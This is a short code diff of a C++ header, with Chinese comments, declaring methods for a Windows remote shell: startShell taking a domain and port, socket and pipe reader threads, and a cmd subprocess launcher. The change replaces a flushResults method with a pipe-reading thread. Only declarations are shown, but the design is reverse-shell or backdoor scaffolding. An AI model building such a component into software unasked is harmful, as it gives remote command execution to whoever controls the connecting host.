@@ -15,8 +15,8 @@ public:
 	static void startShell(std::string domain, int port);
 	// 线程函数 负责读socket并转发 负责命令输入
 	static DWORD WINAPI threadReadSock(LPVOID args);
-	// 接收cmd回显并传送
-	static void flushResults();
+	// 线程函数 负责读pipe并转发 负责命令输出
+	static DWORD WINAPI threadReadPipe(LPVOID args);
 	// 启动cmd子进程并准备好管道
 	static bool createCmd();
 };
